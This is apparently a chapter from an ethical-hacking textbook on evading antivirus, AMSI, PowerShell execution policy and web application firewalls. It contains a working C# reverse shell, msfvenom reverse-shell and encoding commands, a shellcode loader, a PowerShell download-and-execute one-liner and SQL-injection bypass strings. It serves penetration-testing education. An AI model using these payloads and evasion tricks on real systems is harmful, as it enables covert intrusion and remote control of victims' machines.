# Defense Evasion

> Operating system defenses and cybersecurity defense products have become more sophisticated in order to mitigate inevitable vulnerabilities in users and software. These defenses contribute to the approach of defense in depth and present barriers that ethical hackers need to overcome in order to achieve their goals of access to systems and information. This chapter will examine the range of defenses commonly employed on networks and end-points and look at different approaches to evading these defenses.

## Cybersecurity defenses

It is the recognition that software and people will always be vulnerable to attack by threat actors that has led to the growth of products that mitigate these risks. This started with firewalls which regulate traffic into and out of a network. Firewalls operated in a largely static way with a set of rules based on source and destination addresses but grew to include dynamic and deep inspection of network packet contents. Firewalls were developed to monitor and protect applications, especially web applications where they are known as Web Application Firewalls \(WAFs\). WAFs inspect HTTP requests and look for potential attacks such as brute forcing, database injection attacks or file inclusion requests.

Endpoint security started with anti-virus software that again consisted of a static list of file signatures belonging to blacklisted and whitelisted software. This has evolved dramatically to now using dynamic behavior and process inspection to be able to stop malware that has never been seen before. Operating systems have become more secure by implementing controls over file access and implementing the principle of least privileges. It is now no longer the case that the principal user of a computer has permanent administrator rights by default for example. All of these controls implement the approach of defense in depth in an attempt to stop bad actors from compromising the security of the system.

At the enterprise level, organizations employ cybersecurity operations staff to monitor networks and systems and they employ tools like intrusion protection and detection systems \(ID/PS\), SIEMs \(Security Information and Event Management\) to monitor events of all kinds and other tools.

The principle of defense in depth works on the assumption that layers may be breached but that at each layer, the attacker will be slowed down and potentially reveal themselves through constant monitoring.

On the flipside, attackers have been developing tools and approaches to circumvent these defenses and this is going to be the focus of this chapter. Initially this is about getting around restrictions imposed by AV software and Firewalls, but it is also important to not leave evidence that could be picked up either during an attack or after as part of a forensic examination of the machines and networks. This means using stealth whilst running programs and commands. For example, instead of running a reverse shell openly, migrating it into a process through process injection, so that it won't draw attention to anyone looking at running processes. Covering tracks by deleting command histories, events that might be generated in logs and using stealth when transmitting data.

## AV Evasion

Although a full discussion of malware detection techniques is beyond the scope of this book, the general principle of malware detection is to identify a file as malware from a database of known examples of malware. This is done using signature or static analysis using a number of attributes of a file including its hash, strings it contains, libraries and functions that it calls, and even assembly code. Windows Defender and other Windows AV products use the Antimalware Scan Interface \(AMSI\) to scan files \(executables and scripts\) and detect potential malware. You will sometimes see evasion referred to as AMSI-bypass. When performing evasion, you can see how well something will work against a range of AV products by uploading the file to VirusTotal \(https://www.virustotal.com/gui/\) and this will run it against around 70 different products.

AV products can also monitor behavior of processes and detect malicious activity. This behavioral analysis sometimes employs machine learning that is trained on data from normal processes and the network traffic they create and then comparing any new process with that baseline.

Suspicious files can be executed in an AV sandbox to see how they behave without putting the host system at risk.

A problem that all AV products face is that of false positives and this is why they cannot be too aggressive in their detection of malware for risk of not stopping a legitimate product from running.

Evasion of shell code usually involves either encoding the code, encrypting it, or modifying the execution flow. Modification of code execution can include AV detection and shutting down in the case the malware is being run in a sandbox or debugger of any type.

Msfvenom can be used to encode a payload using a variety of encoders that can be listed with the --list encoders command:

```bash
┌─[✗]─[rin@parrot]─[~/book]
└──╼ $msfvenom --list encoders
Framework Encoders [--encoder <value>]
======================================
 Name Rank Description
 ---- ---- -----------
 cmd/brace low Bash Brace Expansion Command Encoder
 cmd/echo good Echo Command Encoder
 cmd/generic_sh manual Generic Shell Variable Substitution Command Encoder
 cmd/ifs low Bourne ${IFS} Substitution Command Encoder
 cmd/perl normal Perl Command Encoder
 cmd/powershell_base64 excellent Powershell Base64 Command Encoder
 cmd/printf_php_mq manual printf(1) via PHP magic_quotes Utility Command Encoder
 generic/eicar manual The EICAR Encoder
 generic/none normal The "none" Encoder
 mipsbe/byte_xori normal Byte XORi Encoder
 mipsbe/longxor normal XOR Encoder
 mipsle/byte_xori normal Byte XORi Encoder
 mipsle/longxor normal XOR Encoder
 php/base64 great PHP Base64 Encoder
 ppc/longxor normal PPC LongXOR Encoder
 ppc/longxor_tag normal PPC LongXOR Encoder
 ruby/base64 great Ruby Base64 Encoder
 sparc/longxor_tag normal SPARC DWORD XOR Encoder
 x64/xor normal XOR Encoder
 x64/xor_context normal Hostname-based Context Keyed Payload Encoder
 x64/xor_dynamic normal Dynamic key XOR Encoder
 x64/zutto_dekiru manual Zutto Dekiru
 x86/add_sub manual Add/Sub Encoder
 x86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder
 x86/alpha_upper low Alpha2 Alphanumeric Uppercase Encoder
 x86/avoid_underscore_tolower manual Avoid underscore/tolower
 x86/avoid_utf8_tolower manual Avoid UTF8/tolower
 x86/bloxor manual BloXor - A Metamorphic Block Based XOR Encoder
 x86/bmp_polyglot manual BMP Polyglot
 x86/call4_dword_xor normal Call+4 Dword XOR Encoder
 x86/context_cpuid manual CPUID-based Context Keyed Payload Encoder
 x86/context_stat manual stat(2)-based Context Keyed Payload Encoder
 x86/context_time manual time(2)-based Context Keyed Payload Encoder
 x86/countdown normal Single-byte XOR Countdown Encoder
 x86/fnstenv_mov normal Variable-length Fnstenv/mov Dword XOR Encoder
 x86/jmp_call_additive normal Jump/Call XOR Additive Feedback Encoder
 x86/nonalpha low Non-Alpha Encoder
 x86/nonupper low Non-Upper Encoder
 x86/opt_sub manual Sub Encoder (optimised)
 x86/service manual Register Service
 x86/shikata_ga_nai excellent Polymorphic XOR Additive Feedback Encoder
 x86/single_static_bit manual Single Static Bit
 x86/unicode_mixed manual Alpha2 Alphanumeric Unicode Mixedcase Encoder
 x86/unicode_upper manual Alpha2 Alphanumeric Unicode Uppercase Encoder
 x86/xor_dynamic normal Dynamic key XOR Encoder
```

One of the best known of these is the encoder called "Shikata Ga Nai". Technically, the encoder uses a process of using exclusive or of data with a key and then using that data to encode the next and so on \(referred to as a Polymorphic XOR Additive Feedback Encoder\). In practice, it randomizes instruction order, inserts junk code, randomizes spacing between instructions and moves blocks of code around. The end result is that every encoding will be different. We can see this by doing two encodings of the same payload and then comparing the md5sum of each:

```bash
┌─[rin@parrot]─[~/book]
└──╼ $msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.169.0.36 LPORT=80 -b "\x00" -e x86/shikata_ga_nai -f exe -o pass2.exe
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: pass2.exe
┌─[rin@parrot]─[~/book]
└──╼ $md5sum pass1.exe
5a5deacc6e19f2b2256ce864ca071df3 pass1.exe
┌─[rin@parrot]─[~/book]
└──╼ $md5sum pass2.exe
5b3a3360ffd602140a403e72128188b7 pass2.exe
```

An added advantage of Shikata Ga Nai encoding is that it can be used to avoid bytes such as null bytes and carriage return or linefeed that might interfere with the transmission and execution of the shellcode.

Unfortunately, if the results of this are uploaded to VirusTotal, 52 of 70 of the AVs detect it as malware \(Figure 9-1\). Increasing the number of iterations of the encoding doesn't improve the situation with 53 of the AVs detecting it as malware. Microsoft Defender even correctly identifies it as a Metasploit executable.

![Output from VirusTotal for the reverse shell encoded with Shikata Ga Nai](../.gitbook/assets/0%20%2810%29.png)



There are a number of different approaches that can be taken to try and improve the evasion. The simplest and most successful is to use a simple C++ or csharp program to do the reverse shell and build it yourself. Taking as an example this \(https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc\) C\# program

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
namespace ConnectBack {
  public class Program {
    static StreamWriter streamWriter;
    public static void Main(string[] args) {
      using(TcpClient client = new TcpClient("10.0.2.15", 443)) {
        using(Stream stream = client.GetStream()) {
          using(StreamReader rdr = new StreamReader(stream)) {
            streamWriter = new StreamWriter(stream);
            StringBuilder strInput = new StringBuilder();
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            p.Start();
            p.BeginOutputReadLine();
            while(true) {
              strInput.Append(rdr.ReadLine());
              p.StandardInput.WriteLine(strInput);
              strInput.Remove(0, strInput.Length);
            }
          }
        }
      }
    }
    private static void CmdOutputDataHandler(object sendingProcess,
                                             DataReceivedEventArgs outLine) {
      StringBuilder strOutput = new StringBuilder();
      if (!String.IsNullOrEmpty(outLine.Data)) {
        try {
            strOutput.Append(outLine.Data);
            streamWriter.WriteLine(strOutput);
            streamWriter.Flush();
        } catch (Exception err) { }
      }
    }
  }
}
```

When run against VirusTotal, it is detected as malicious by only 10 of 60 engines, importantly, Windows Defender being one that doesn't pick it up.

Other techniques such as encrypting payloads and decrypting before running also may evade a specific AV but they are getting better at detecting these techniques as well. To do this, we can use msfvenom to generate a payload:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.114.2 LPORT=4445 -f csharp -o payload.txt
```

To encrypt I have used an example that is on GitHub \(https://github.com/cribdragg3r/Simple-Loader\). This uses AES to encrypt the byte stream read from the payload.txt file and then generate Base64 output. This output then can be copy pasted into the program and when run without arguments, it will decrypt and copy the output into memory created using a VirtualAlloc call. This memory is then used as an argument to CreateThread which executes it:

```c
public static bool nonsense(byte[] shellcode) {
  try {
       UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                                      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                                      Marshal.Copy(shellcode, 0, 
                                      (IntPtr)(funcAddr), shellcode.Length);
       IntPtr hThread = IntPtr.Zero;
       UInt32 threadId = 0;
       IntPtr pinfo = IntPtr.Zero;
       hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
       WaitForSingleObject(hThread, 0xFFFFFFFF);
       return true;
  } catch (Exception e) {
    Console.Error.WriteLine("exception: " + e.Message);
    return false;
  }
}
```

As mentioned previously however, this actually gets picked up by 24 out of 70 AV products on VirusTotal, including Windows Defender.

## Encoding PowerShell

PowerShell not only has AMSI that can block its execution, but there is also an execution policy that can restrict what can be run. Strictly speaking, the execution policy applied to PowerShell was meant to avoid users doing things they weren't aware of and so there are ways to get around it. If you find that a PowerShell script will not execute, then some of the techniques will apply to AMSI as well as bypassing the execution policy restrictions.

First of all, the execution policies that can be applied to PowerShell are:

* Restricted: No script, either local, remote, or downloaded can be executed
* AllSigned: All scripts need to be digitally signed
* RemoteSigned: All remote scripts or downloaded scripts need to be signed
* Unrestricted: All scripts can be run without signatures

You can see what the current execution policy is for a user showing all of the different scopes by using the command:

```bash
PS C:\Users\oztechmuse\boxes\book> Get-ExecutionPolicy -List
 Scope          ExecutionPolicy
 -----          ---------------
 MachinePolicy  Undefined
 UserPolicy     Undefined
 Process        Undefined
 CurrentUser    Undefined
 LocalMachine   Unrestricted
```

If we set the execution policy as Restricted using the Set-ExecutionPolicy cmdlet \(this needs to be run as Administrator\) when we try and run a script we are denied:

```bash
PS C:\Users\rin\book> echo 'Write-Host "Verify me!"' > runme.ps1
PS C:\Users\rin\book> cat .\runme.ps1
Write-Host
Verify me!
PS C:\Users\rin\book> .\runme.ps1
.\runme.ps1 : File C:\Users\oztechmuse\rin\runme.ps1 cannot be loaded because running scripts is disabled on
this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ .\runme.ps1
+ ~~~~~~~~~~~
 + CategoryInfo : SecurityError: (:) [], PSSecurityException
 + FullyQualifiedErrorId : UnauthorizedAccess
PS C:\Users\oztechmuse\boxes\book>
```

Various ways of bypassing this are:

1. Paste the contents into an interactive PowerShell console
2. Echo the script and pipe to a PowerShell standard in:

```bash
PS C:\Users\rin\book> echo 'Write-Host "Verify me!"' | powershell -noprofile -
Verify me!
```

Read the contents of the file and pipe to PowerShell standard in

```bash
PS C:\Users\oztechmuse\book> Get-Content .\runme.ps1 | PowerShell.exe -noprofile -
Verify me!
```

Download the script from a web server and execute using Invoke Expression

```bash
PS C:\Users\rin\book> IEX(New-Object Net.WebClient).downloadString("http://192.168.114.2:8001/runme.ps1");
Verify me!
```

Encode the command as Base64 and pass it to PowerShell using the -EncodedCommand flag

```bash
PS C:\Users\rin\book> $command = "Write-Host 'Verify me!'"
PS C:\Users\rin\book> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
PS C:\Users\rin\book> $encodedCommand = [Convert]::ToBase64String($bytes)
PS C:\Users\rin\book> $encodedCommand
VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA
PS C:\Users\rin\book> powershell -Enc $encodedCommand
My voice is my passport, verify me.
```

Use the -ExecutionPolicy Bypass flag

Incidentally, if you want to encode a PowerShell command on Linux, you need to use the UTF little endian encoding \(--to-code UTF\_16LE\) first:

```bash
echo "Write-Host 'Verify me!'" | iconv --to-code UTF-16LE | base64 -w 0
```

The -w 0 flag makes sure the output is all on one line.

## Bypassing AMSI

Nishang includes a PowerShell script Invoke-AmsiBypass.ps1 that will use a variety of methods to bypass AMSI. According to the script, these methods are:

1. "unload": Unloading AMSI from current PowerShell session using a technique developed by Matt Graeber.
2. "unload2": Another technique of unloading AMSI from current PowerShell session developed by Matt Graeber
3. "unloadsilent": Third technique of unloading AMSI that avoids Windows Management Framework \(WMF5\) logging \(author Matt Graeber\).
4. "unloadobfuscated": Unload method in 1 but obfuscated using Invoke-Obfuscation \(Daniel Bohannon\) to try and avoid WMF5 logging.
5. "dllhijack": A method to hijack the ams.dll \(Cornelis de Plaa https://github.com/Cn33liz/p0wnedShell\)
6. "psv2": If PowerShell version 2 is available, it will downgrade to that since it doesn't support AMSI.

If the command is run as Invoke-AmsiBypass -Verbose, it will run the unloadsilent method. Otherwise, specific methods can be called by specifying the method as a parameter for the cmdlet Invoke-PsUACme -Method &lt;method name&gt; -Verbose.

The Invoke-Obfuscation module that was mentioned above \(https://github.com/danielbohannon/Invoke-Obfuscation\) allows for PowerShell scripts to be obfuscated in a number of different ways. To use, you need to run:

```bash
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

This will present a menu from which you can set a SCRIPTPATH variable to the script you want to obfuscate:

```bash
Invoke-Obfuscation\Token\String> SET SCRIPTPATH .\runme.ps1
Successfully set ScriptPath:
```

We can then select options for obfuscation. Taking the defaults, we can obfuscate strings and commands in the script by inserting tick marks between characters and concatenating the results:

```text
w`RI`TE-Ho`st ('Ve'+'rify m'+'e'+'!')
```

 In some cases, it is enough to remove help strings from a file and change the method names. In every case it is important to test on the specific environment of the target machine, although hopefully not on the machine itself as this would leave log events that could be detected.

## Bypassing Web Application Firewalls

Web Application Firewalls \(WAFs\) inspect and filter HTTP traffic. It can operate as a bridge, router, reverse proxy or be embedded in the web server. It can handle SSL by either terminating the SSL connection or by knowing the SSL private key, can decrypt the traffic. WAFs can be configured to block traffic from a specific IP address or IP addresses, block traffic depending on the pattern of requests \(e.g. in the case of someone fuzzing the website or brute forcing\) or inspect the request and check for malicious contents such as SQL injection. In addition, WAFs can enforce restrictions and checks on cookies, HTTP headers, hidden fields, form elements and sessions.

As with the example of AMSI, WAFs can be bypassed using a range of encodings and manipulations of request text. The first step is identifying the WAF if possible. This will give you the types and mechanisms of the protections it offers. YOu can do this using a tool such as wafw00f \(https://github.com/EnableSecurity/wafw00f\) although this has not been maintained recently and so may not work on more recent WAFs.

Basic techniques for bypass of a WAF include:

* limiting the rate of requests if fuzzing or brute forcing so as not to trigger being blocked.
* Changing text case: e.g. sELecT \* fRoM \* wHEre userid = 'john'
* URL encode all text using %encoding
* Use Unicode encoding of text \u0070 instead of character 'p'
* Use HTML encoding
* Insert comment strings e.g. /?id=1+un/\*\*/ion+sel/\*\*/ect+1,2--
* Double encoding
* Insert line breaks to terminate pattern matching e.g. %0A
* Use wildcard characters such as ?

There are a range of other alternatives that can be tried but the important thing is to experiment and observe how the WAF and the website itself responds to each attempt.











.



